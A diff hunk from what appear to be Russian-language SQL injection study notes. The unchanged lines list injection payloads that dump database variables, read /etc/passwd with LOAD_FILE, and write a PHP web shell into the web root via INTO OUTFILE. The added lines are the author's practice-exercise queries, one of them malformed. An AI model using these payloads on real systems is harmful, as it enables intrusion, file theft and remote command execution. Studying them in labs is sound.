@@ -78,3 +78,11 @@ cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.glo
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - 	Чтение локального файла
 select 'file written successfully!' into outfile '/var/www/html/proof.txt' 	Записать строку в локальный файл
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - 	Запишите веб-оболочку в базовый веб-каталог. 
+
+
+
+
+Мои решения:  + 1 Каково количество записей в таблице «должности», ГДЕ номер сотрудника больше 10000 ИЛИ их должность НЕ содержит слово «инженер»? 
+mysql> SELECT * FROM titles WHERE emp_no > 10000 OR title  % 'Engineer';
+
+SELECT COUNT(*) FROM employees.titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
